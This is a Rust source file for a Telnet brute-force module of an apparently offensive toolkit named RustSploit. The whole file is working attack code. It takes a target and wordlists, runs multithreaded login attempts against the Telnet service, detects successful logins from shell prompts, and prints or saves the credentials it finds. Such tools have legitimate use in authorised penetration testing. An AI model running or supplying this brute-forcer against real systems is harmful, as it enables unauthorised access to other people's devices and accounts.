use anyhow::{Result, Context};
use regex::Regex;
use std::fs::{File, OpenOptions};
use std::io::{self, BufRead, BufReader, Write};
use std::net::{TcpStream, ToSocketAddrs};
use std::sync::{Arc, Mutex};
use std::time::Duration;
use telnet::Event;
use threadpool::ThreadPool;
use crossbeam_channel::unbounded;
use telnet::Telnet;

pub async fn run(target: &str) -> Result<()> {
    println!("\n=== Telnet Bruteforce Module (RustSploit) ===\n");

    let target = target.to_string();
    let port = prompt("Port (default 23): ").parse().unwrap_or(23);
    let username_wordlist = prompt("Username wordlist file: ");
    let password_wordlist = prompt("Password wordlist file: ");
    let threads = prompt("Number of threads (default 8): ").parse().unwrap_or(8);
    let stop_on_success = prompt("Stop on first valid login? (y/n): ")
        .trim()
        .eq_ignore_ascii_case("y");
    let full_combo = prompt("Try every username with every password? (y/n): ")
        .trim()
        .eq_ignore_ascii_case("y");
    let verbose = prompt("Verbose mode? (y/n): ")
        .trim()
        .eq_ignore_ascii_case("y");

    let config = TelnetBruteforceConfig {
        target,
        port,
        username_wordlist,
        password_wordlist,
        threads,
        stop_on_success,
        verbose,
        full_combo,
    };

    run_telnet_bruteforce(config)
}

#[derive(Clone)]
struct TelnetBruteforceConfig {
    target: String,
    port: u16,
    username_wordlist: String,
    password_wordlist: String,
    threads: usize,
    stop_on_success: bool,
    verbose: bool,
    full_combo: bool,
}

fn run_telnet_bruteforce(config: TelnetBruteforceConfig) -> Result<()> {
    // 1) Normalize & validate host:port
    let addr = normalize_target(&config.target, config.port)
        .context("Invalid target address")?;
    let socket_addr = addr
        .to_socket_addrs()?
        .next()
        .context("Unable to resolve target address")?;

    println!("\n[*] Starting Telnet bruteforce on {}", socket_addr);

    let usernames = read_lines(&config.username_wordlist)?;
    let passwords = read_lines(&config.password_wordlist)?;

    let creds = Arc::new(Mutex::new(Vec::new()));
    let stop_flag = Arc::new(Mutex::new(false));
    let pool = ThreadPool::new(config.threads);
    let (tx, rx) = unbounded();

    // 2) Build the combo queue
    if config.full_combo {
        for u in &usernames {
            for p in &passwords {
                tx.send((u.clone(), p.clone()))?;
            }
        }
    } else if usernames.len() == 1 {
        for p in &passwords {
            tx.send((usernames[0].clone(), p.clone()))?;
        }
    } else if passwords.len() == 1 {
        for u in &usernames {
            tx.send((u.clone(), passwords[0].clone()))?;
        }
    } else {
        println!("[!] Multiple creds & full_combo=OFF → using first username.");
        for p in &passwords {
            tx.send((usernames[0].clone(), p.clone()))?;
        }
    }
    drop(tx);

    // 3) Spawn workers
    for _ in 0..config.threads {
        let rx = rx.clone();
        let addr = addr.clone();
        let stop_flag = Arc::clone(&stop_flag);
        let creds = Arc::clone(&creds);
        let cfg = config.clone();

        pool.execute(move || {
            while let Ok((user, pass)) = rx.recv() {
                if *stop_flag.lock().unwrap() {
                    break;
                }
                if cfg.verbose {
                    println!("[*] Trying {}:{}", user, pass);
                }
                match try_telnet_login(&addr, &user, &pass) {
                    Ok(true) => {
                        println!("[+] Valid: {}:{}", user, pass);
                        creds.lock().unwrap().push((user, pass));
                        if cfg.stop_on_success {
                            *stop_flag.lock().unwrap() = true;
                            break;
                        }
                    }
                    Ok(false) => {}
                    Err(e) => {
                        if cfg.verbose {
                            eprintln!("[!] Error: {}", e);
                        }
                    }
                }
            }
        });
    }
    pool.join();

    // 4) Report & optional save
    let found = creds.lock().unwrap();
    if found.is_empty() {
        println!("[-] No valid credentials found.");
    } else {
        println!("\n[+] Found credentials:");
        for (u, p) in found.iter() {
            println!(" - {}:{}", u, p);
        }
        if prompt("\n[?] Save to file? (y/n): ")
            .trim()
            .eq_ignore_ascii_case("y")
        {
            let file = prompt("Filename: ");
            if let Err(e) = save_results(&file, &found) {
                eprintln!("[!] Failed to save: {}", e);
            } else {
                println!("[+] Results saved to '{}'", file);
            }
        }
    }

    Ok(())
}

/// Attempt a single login, with 0.7 s connect+I/O timeout
fn try_telnet_login(addr: &str, username: &str, password: &str) -> Result<bool> {
    // Resolve to SocketAddr
    let socket = addr
        .to_socket_addrs()?
        .next()
        .ok_or_else(|| anyhow::anyhow!("Could not resolve address"))?;

    // Connect with 1500 ms timeout
    let stream = TcpStream::connect_timeout(&socket, Duration::from_millis(1500))
        .context("Connection timed out")?;
    // I/O timeout
    stream
        .set_read_timeout(Some(Duration::from_millis(1500)))
        .context("Failed to set read timeout")?;
    stream
        .set_write_timeout(Some(Duration::from_millis(1500)))
        .context("Failed to set write timeout")?;

    // Wrap into Telnet
    let mut connection = Telnet::from_stream(Box::new(stream), 256);

    let mut login_seen = false;
    let mut pass_seen = false;
    for _ in 0..10 {
        let event = connection.read().context("Read error or timeout")?;
        if let Event::Data(buffer) = event {
            let out = String::from_utf8_lossy(&buffer).to_lowercase();
            if !login_seen && (out.contains("login:") || out.contains("username")) {
                connection.write(format!("{}\n", username).as_bytes())?;
                login_seen = true;
            } else if login_seen && !pass_seen && out.contains("password") {
                connection.write(format!("{}\n", password).as_bytes())?;
                pass_seen = true;
            } else if pass_seen {
                if out.contains("incorrect")
                    || out.contains("failed")
                    || out.contains("denied")
                {
                    return Ok(false);
                }
                if out.contains("last login")
                    || out.contains("$")
                    || out.contains("#")
                    || out.contains("welcome")
                {
                    return Ok(true);
                }
            }
        }
    }

    Ok(false)
}

fn read_lines(path: &str) -> Result<Vec<String>> {
    let f = File::open(path).context(format!("Unable to open {}", path))?;
    Ok(BufReader::new(f).lines().filter_map(Result::ok).collect())
}

fn save_results(path: &str, creds: &[(String, String)]) -> Result<()> {
    let mut f = OpenOptions::new()
        .create(true)
        .write(true)
        .truncate(true)
        .open(path)?;
    for (u, p) in creds {
        writeln!(f, "{}:{}", u, p)?;
    }
    Ok(())
}

fn prompt(msg: &str) -> String {
    print!("{}", msg);
    io::stdout().flush().unwrap();
    let mut buf = String::new();
    io::stdin().read_line(&mut buf).unwrap();
    buf.trim().to_string()
}

/// Enhanced IPv4/IPv6/domain normalizer & resolver
fn normalize_target(host: &str, default_port: u16) -> Result<String> {
    let re = Regex::new(r"^\[*(?P<addr>[^\]]+?)\]*(?::(?P<port>\d{1,5}))?$").unwrap();
    let caps = re
        .captures(host.trim())
        .ok_or_else(|| anyhow::anyhow!("Invalid target format: {}", host))?;
    let addr = caps.name("addr").unwrap().as_str();
    let port = if let Some(m) = caps.name("port") {
        m.as_str().parse::<u16>().context("Invalid port value")?
    } else {
        default_port
    };
    let formatted = if addr.contains(':') && !addr.contains('.') {
        format!("[{}]:{}", addr, port)
    } else {
        format!("{}:{}", addr, port)
    };
    // Verify DNS/getaddrinfo
    formatted
        .to_socket_addrs()
        .context(format!("Could not resolve {}", formatted))?;
    Ok(formatted)
}
